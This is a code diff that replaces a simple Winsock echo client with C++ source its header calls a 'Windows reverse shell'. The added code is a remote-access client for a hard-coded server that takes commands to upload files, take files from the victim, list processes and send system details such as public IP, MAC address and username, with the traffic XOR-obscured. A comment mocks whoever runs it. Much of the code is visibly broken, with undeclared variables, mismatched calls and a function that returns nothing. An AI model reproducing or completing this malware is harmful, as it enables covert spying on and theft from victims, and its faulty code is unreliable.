@@ -1,135 +1,457 @@
-#define WIN32_LEAN_AND_MEAN
-
-#include <windows.h>
+/*
+author: @Reycecar
+Windows reverse shell
+*/
 #include <winsock2.h>
+#include <Windows.h>
 #include <ws2tcpip.h>
-#include <stdlib.h>
 #include <stdio.h>
+#include <tlhelp32.h>
+#include <iostream>
+#include <sstream>
+#include <Lmcons.h>
+#include <wininet.h>
+#include <winsock.h>
+#include <iptypes.h>
+#include <iphlpapi.h>
+#include <fileapi.h>
+#include <string.h>
+#include <rpc.h>
+#pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib, "Wininet.lib")
+#pragma comment(lib, "IPHLPAPI.lib")
+#pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "Rpcrt4.lib")
 
+#define SERV_PORT "25565" //Default port for Minecraft Java
+#define SERV_ADDR "127.0.0.1"
+#define DEFAULT_BUFLEN 1024
+using namespace std;
 
-// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
-#pragma comment (lib, "Ws2_32.lib")
+// used to encrypt/decrypt data
+char* xor_func(char msg[]) {
+	for (int i = 0; i < strlen(msg); i++) {
+		msg[i] ^= '♥';
+	}
+}
 
-#define DEFAULT_BUFLEN 512
-#define DEFAULT_PORT "9999"
+// get the username of the user foolish enough to run this godforsaken program
+std::string getUsername() {
+    DWORD bufferSize = 0;
+    GetUserNameA(NULL, &bufferSize);
+    if (bufferSize == 0) {
+        return ""; // If username space is 0 return emptystring
+    }
+    char* buffer = new char[bufferSize];
+    if (GetUserNameA(buffer, &bufferSize)) {
+        std::string username(buffer);
+        delete[] buffer;
+        return username;
+    }
+    delete[] buffer;
+    return "";
+}
 
-int main() {
-    WSADATA wsaData;
-    SOCKET ConnectSocket = INVALID_SOCKET;
-    struct addrinfo* result = NULL;
-    struct addrinfo hints;
-
-    char* server = "localhost";
-    char recvbuf[DEFAULT_BUFLEN];
-    int recvbuflen = DEFAULT_BUFLEN;
-    int iResult;
-
-
-    // Initialize Winsock
-    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
-    if (iResult != 0) {
-        printf("WSAStartup failed with error: %d\n", iResult);
-        return 1;
+std::string getMACs() {
+	std::string mac;
+    ULONG size = 0;
+	
+	// Get the network adapter information
+    if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &size) != ERROR_BUFFER_OVERFLOW) {
+        return ""; // if buffer overflow: ret blank
+    }
+    PIP_ADAPTER_ADDRESSES adapterAddresses = (PIP_ADAPTER_ADDRESSES)malloc(size);
+    if (adapterAddresses == NULL) {
+        return ""; // if not adapter addresses: ret blank
+    }
+    if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, adapterAddresses, &size) != NO_ERROR) {
+        free(adapterAddresses);
+        return ""; // if errors: ret blank
     }
 
-    ZeroMemory(&hints, sizeof(hints));
-    hints.ai_family = AF_UNSPEC;
-    hints.ai_socktype = SOCK_STREAM;
-    hints.ai_protocol = IPPROTO_TCP;
-    hints.ai_flags = AI_PASSIVE;
-
-    // Resolve the server address and port
-    iResult = getaddrinfo(server, DEFAULT_PORT, &hints, &result);
-    if (iResult != 0) {
-        printf("getaddrinfo failed with error: %d\n", iResult);
-        WSACleanup();
-        return 1;
-    }
-
-    // Attempt to connect to an address until one succeeds
-    for (struct addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next) {
-
-        // Create a SOCKET for connecting to server
-        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
-
-        if (ConnectSocket == INVALID_SOCKET) {
-            printf("socket failed with error: %ld\n", WSAGetLastError());
-            WSACleanup();
-            return 1;
-        }
-
-        // Connect to server.
-        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
-        if (iResult == SOCKET_ERROR) {
-            printf("Connection failed with error: %d\n", WSAGetLastError());
-            closesocket(ConnectSocket);
-            ConnectSocket = INVALID_SOCKET;
-            continue;
-        }
-        break; //got a connection, or none worked
-    }
-
-    freeaddrinfo(result);
-
-    if (ConnectSocket == INVALID_SOCKET) {
-        printf("Unable to connect to server!\n");
-        WSACleanup();
-        return 1;
-    }
-
-    char buf[DEFAULT_BUFLEN];
-    char rep[3];
-    int Result;
-    int temp;
-
-    recv(ConnectSocket, buf, DEFAULT_BUFLEN, 0);
-
-    printf("%s\n", buf);
-
-
-    // Receive until the peer closes the connection
-    do {
-        memset(buf, 0, DEFAULT_BUFLEN);
-        memset(recvbuf, 0, DEFAULT_BUFLEN);
-        memset(rep, 0, sizeof(rep));
-        printf("enter a word to send to the server: ");
-        scanf_s("%s", recvbuf, DEFAULT_BUFLEN);
-
-        iResult = send(ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
-
-        if (iResult == SOCKET_ERROR)
-        {
-            printf("send failure with error: %d\n", WSAGetLastError());
-            closesocket(ConnectSocket);
-            WSACleanup();
-            return 1;
-        }
-        if (strcmp(recvbuf, "quit") == 0) {
+    // Iterate over the network adapters and find the MAC address
+    PIP_ADAPTER_ADDRESSES adapter = adapterAddresses;
+    while (adapter != NULL) {
+        if (adapter->PhysicalAddressLength > 0) {
+            char macBuff[18];
+			// format mac into string
+            sprintf_s(macBuff, sizeof(macBuff), "%02X:%02X:%02X:%02X:%02X:%02X",
+                adapter->PhysicalAddress[0], adapter->PhysicalAddress[1], adapter->PhysicalAddress[2],
+                adapter->PhysicalAddress[3], adapter->PhysicalAddress[4], adapter->PhysicalAddress[5]);
+            mac = macBuff;
             break;
         }
+        adapter = adapter->Next;
+    }
 
-        recv(ConnectSocket, rep, sizeof(rep), 0); // should be the random num
-        temp = atoi(rep);
+    // Clean up, Clean Up, Everybody Do your share!
+    free(adapterAddresses);
+    return mac;
+}
 
-        for (int i = 0; i < temp; i++) {
-            memset(recvbuf, 0, DEFAULT_BUFLEN);
-            if (iResult > 0) {
-                printf("Bytes received: %d\n", iResult);
-                printf("Received: %s\n", recvbuf);
-            }
-            else if (iResult == 0) {
-                printf("Connection closed\n");
-            }
-            else {
-                printf("recv failed with error: %d\n", WSAGetLastError());
-            }
+// Function for getting the public facing IP address.
+std::string getPublicIP() {
+	HANDLE hInt = InternetOpen(L"Mozilla/5.0",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL, 0);
+	// Create hConnect handle for ifconfig.me
+	HANDLE hConn = InternetConnectA(hInt, "ifconfig.me", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
+	// Pass hConnect handle into HttpOpenRequestA with request to ifconfig.me/ip
+	HANDLE hReq = HttpOpenRequestA(hConn, "GET", "/ip", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
+	// Helper function returns response string generated by ifconfig.me
+	std::string resp = get_response_string(hReq);
+	if (hReq) { // If hRequest is successful: teardown (In reverse order of creation!!!)
+		InternetCloseHandle(hReq);
+	}
+	if (hConn) { // If hConnect is successful: teardown
+		InternetCloseHandle(hConn);
+	}
+	return resp;
+}
+
+// Helper function for getPublicIP()
+std::string get_response_string(HANDLE hReq) {
+	BOOL reqSuccess = HttpSendRequestA(hReq, NULL, NULL, NULL, NULL);
+	if (reqSuccess) {
+		// Initialize variables for internetReadFile
+		DWORD recvData = 0;
+		DWORD chunkSize = 2048;
+		std::string buf;
+		std::string chunk(chunkSize, 0);
+		while (InternetReadFile(hReq, &chunk[0], chunkSize, &recvData) && recvData) {
+			chunk.resize(recvData);
+			buf += chunk;
+		}
+		//return file read buffer data
+		return buf;
+	}
+	return nullptr;
+}
+
+// get the windows os version
+std::string getWinVer() {
+    OSVERSIONINFOEX osvi;
+    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
+    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
+    GetVersionEx((OSVERSIONINFO*)&osvi); // Retrieve specific version of windows w/ GetVersionEx
+
+    // Extract the major and minor version numbers
+    int majorVersion = osvi.dwMajorVersion;
+    int minorVersion = osvi.dwMinorVersion;
+
+    // Get the build number if it is available
+    int buildNumber = 0;
+    if (osvi.dwPlatformId == VER_PLATFORM_WIN32_NT && majorVersion >= 6) {
+        ULONGLONG conditionMask = 0;
+        VER_SET_CONDITION(conditionMask, VER_BUILDNUMBER, VER_GREATER_EQUAL);
+        osvi.dwBuildNumber = 0;
+        // Verify that the system meets the condition
+        if (VerifyVersionInfo(&osvi, VER_BUILDNUMBER, conditionMask)) {
+            buildNumber = osvi.dwBuildNumber;
         }
+    }
 
-    } while (strcmp(recvbuf, "quit") != 0);
+    // Determine the returned string based on the operating system
+    std::ostringstream oss;
+    oss << "Windows ";
+    switch (majorVersion) {
+    case 10:
+        oss << "10";
+        break;
+    case 6:
+        switch (minorVersion) {
+        case 3:
+            oss << "8.1";
+            break;
+        case 2:
+            oss << "8";
+            break;
+        case 1:
+            oss << "7";
+            break;
+        case 0:
+            oss << "Vista";
+            break;
+        }
+        break;
+    case 5:
+        switch (minorVersion) {
+        case 2:
+            oss << "Server 2003";
+            break;
+        case 1:
+            oss << "XP";
+            break;
+        case 0:
+            oss << "2000";
+            break;
+        }
+        break;
+    }
+    if (buildNumber > 0) {
+        oss << " (Build " << buildNumber << ")";
+    }
+    return oss.str();
+}
 
-    // cleanup
-    closesocket(ConnectSocket);
-    WSACleanup();
+//use previous functions in information string.
+std::string getSysInfo() {
+	return  "PUBLIC IP:\n" + getPublicIP() + "\n\n" +
+			"MAC Addresses:\n" + getMACs() +"\n\n" + 
+			"WINDOWS VERSION:\n" + getWinVer() + "\n\n" +
+			"USERNAME:\n" + getUsername();
+}
 
-    return 0;
+//get data from process and turn it into human readable/understandable information
+std::string listProcesses() {
+    std::string processList;
+    HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hTH32 != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 procEntry;
+        procEntry.dwSize = sizeof(PROCESSENTRY32);
+        if (Process32First(hTH32, &procEntry)) {
+            do {
+                std::wstring wpname(procEntry.szExeFile);
+                std::string pname(wpname.begin(), wpname.end());
+                processList += pname;
+                processList += ":";
+                char buf[UNLEN + 1];
+                DWORD len = UNLEN + 1;
+                _itoa_s(procEntry.th32ProcessID, buf, 10);
+                buf[UNLEN] = 0;
+                processList += buf;
+                processList += "\n";
+            } while (Process32Next(hTH32, &procEntry));
+        }
+        CloseHandle(hTH32);
+    }
+    return processList;
+}
+
+// Client uploads to server.
+void handle_upload(int sock){
+    char *p_char;
+    char tokenBuffer[1024];
+    char dataBuffer[1024];
+    int fileSize, bytesRead,over,received = 0;
+    char fileSizeBuf[1024];
+    FILE *fp = fopen("output","w+b");
+    // Receive first 1024 of file and parse out file size
+    // Bytes read has 12 subtracted to account for message header
+    recv(sock, fileSizeBuf, sizeof(fileSizeBuf), 0);
+
+    xor_func(fileSizeBuf);
+
+    printf("file size: %s\n",fileSizeBuf);  // Debug
+    fileSize = atoi(fileSizeBuf);
+    printf("file size = %d\n",fileSize);  // Debug
+    
+    while (bytesRead < fileSize){
+        received = recv(sock, tokenBuffer,1024,0);
+        bytesRead += received;
+        if (bytesRead > fileSize){
+            printf("fix da overage...");  //Debug
+            over = bytesRead - fileSize;
+        }
+        fileSize--;
+        strncpy(dataBuffer, xor_func(tokenBuffer), received - over);
+        fputs(dataBuffer,fp);
+    fclose(fp);
+    } 
+}
+
+// Client handles download from server.
+void handle_download(SOCKET sock, char * path) {
+	int filesize = 0;
+	int total_read = 0;
+	char buf[1024] = {0};
+	DWORD current_read_bytes = 0;
+	DWORD read_bytes = 0;
+
+	// read file size
+
+	HANDLE fhandle = CreateFileA((LPCSTR) path, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (fhandle == INVALID_HANDLE_VALUE) {
+		printf("CreateFileA error: %d\n", GetLastError());
+		exit(-1);
+	}
+
+	// get file size
+
+	filesize = GetFileSize(fhandle, NULL);
+	printf("filesize: %d\n", filesize); // Debug
+	if (filesize == INVALID_FILE_SIZE) {
+		printf("filesize error: %d\n", GetLastError());
+	}
+	// send file size
+	send(sock, (char *)&filesize, 4, 0);
+
+	while (total_read < filesize) {		
+		if (!ReadFile(fhandle, buf, 1024, &read_bytes, NULL)) {
+			printf("ReadFile Error: %d", GetLastError());
+		}
+		total_read += read_bytes;
+		// xor data
+		xor_func(buf, read_bytes);
+		send(sock, buf, read_bytes, 0);
+	}
+	CloseHandle(fhandle);
+}
+
+int parseCmd(char cmd[]){
+	if(strstr(cmd, "end") != NULL) {
+		return -1;
+	} else if(strstr(cmd,"upload") != NULL) {
+	    return 0;
+    } else if(strstr(cmd,"download") != NULL) {
+        return 1;
+    } else if(strstr(cmd,"processes") != NULL) {
+        return 2;
+    } else if(strstr(cmd,"sysinfo") != NULL) {
+        return 3;
+    }
+}
+
+SOCKET getConnected() {
+	WSADATA wsaData;
+    SOCKET sock;
+    struct sockaddr_in address;
+    struct sockaddr_in server;
+	int connResult; 
+
+	struct addrinfo* result = NULL,
+		* ptr = NULL,
+		hints;
+
+	connResult = WSAStartup(MAKEWORD(2,2), &wsaData);
+	if (connResult != 0) {
+		printf("WSAStartup failed with error: %d\n", connResult);
+		return 1;
+	}
+
+	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
+		printf("Socket creation failed: %d", WSAGetLastError());
+		WSACleanup();
+		return 1;
+	}
+
+	ZeroMemory(&hints, sizeof(hints));
+
+	hints.ai_family = AF_INET;	 // AF_UNSPEC can cause errors
+	hints.ai_socktype = SOCK_STREAM; // socket type: sock stream
+	hints.ai_protocol = IPPROTO_TCP; // IP protocol: TCP
+
+	connResult = getaddrinfo(SERV_ADDR, SERV_PORT, &hints, &result);
+	if (connResult != 0) {
+		printf("getaddrinfo failed: %d\n", connResult);
+		WSACleanup();
+		return 1;
+	}
+
+	ptr = result;
+
+	connResult = connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
+	if (connResult == SOCKET_ERROR) {
+		closesocket(sock);
+		printf("Connection failure.\n");
+		WSACleanup();
+		return 1;
+	}
+
+    return sock;
+}
+
+int main(int argc, char const* argv[]) {
+	char filepath[4096];
+	int cmd;
+	int command_packet_len;
+	char buffer[1024] = {0};
+	char msg[1024];
+	char data[1024];
+	SOCKET sock;
+	sock = getConnected();
+
+	printf("Connection to server successful! It's a miracle!!\n");
+
+	while(true) {
+		std::string procs;
+		int getcmd;
+		
+		memset(buffer,0,sizeof(buffer));
+		memset(data,0,sizeof(data));
+		
+		/*// read command type
+		recv(sock, (char *)&command, 4, 0);
+		printf("Command type: %d\n", command);
+		// read command length
+		recv(sock, (char *)&command_packet_len, 4, 0);
+		
+ 		char * path = (char *)malloc(command_packet_len);
+
+		ZeroMemory(path, command_packet_len);*/
+
+		getcmd = recv(sock, buffer, 1024, 0); //read cmd into buffer from sock
+		int cmd = parseCmd(xor_func(buffer));
+
+		switch(cmd) {
+			case -1: //end
+				printf("Shutting down"); //debug
+				shutdown(sock, 2);
+				send(sock, msg, strlen(msg), 0);
+				return 0;
+			case 0:
+				printf("Upload buffer is: %s\n", buffer);  //debug
+				handle_upload(sock); // receive the file
+            	sprintf(msg, "Received File"); // tell server client recieved the file
+            	xor_func(msg);
+            	send(sock, msg, strlen(msg), 0);
+				break;
+			case 1:
+				printf("Download"); // debug
+
+				recv(sock, path, command_packet_len, 0); // fix
+				path[command_packet_len] = 0x00;
+
+				handle_download(sock, path); // fix
+				// read command_packet_length bytes into filename
+				// open filename, send chunks back out socket
+				break;
+			case 2:
+				printf("processes");
+				procs = listProcesses();
+				int offset = 0;
+				printf("list processes length: %d", procs.length());
+				while (offset < procs.length()) {
+					string chunk = procs.substr(offset, 1024);
+					char* c = const_cast<char*>(chunk.c_str()); // convert chunk to c_str
+					xor_func(c); // xor the chunk
+					const char *chunkBuffer = c; // put xor'd chunk in buffer
+					printf("sending %d bytes", strlen(chunkBuffer));
+					send(sock, chunkBuffer, strlen(chunkBuffer), 0);
+					offset += 1024;
+				}
+				strcpy(data, "gettfouttahereistfg"); // send string to signify end of message
+				xor_func(data);
+				send(sock, data, strlen(data), 0);
+				break;
+			case 3:
+				printf("systeminfo");
+				procs = getSysInfo();
+				int offset = 0;
+				printf("systeminfo length: %d", procs.length());
+				while (offset < procs.length()) {
+					string chunk = procs.substr(offset, 1024);
+					char* c = const_cast<char*>(chunk.c_str()); // convert chunk to c_str
+					xor_func(c); // xor the chunk
+					const char *chunkBuffer = c; // put xor'd chunk in buffer
+					printf("sending %d bytes", strlen(chunkBuffer));
+					send(sock, chunkBuffer, strlen(chunkBuffer), 0); // send chunk
+					offset += 1024;
+				}
+				strcpy(data, "gettfouttahereistfg"); // send string to signify end of message
+				xor_func(data); // xor end string
+				send(sock, data, strlen(data), 0); //send end string
+				break;
+		}
+		//free(path);
+	}
+
 }
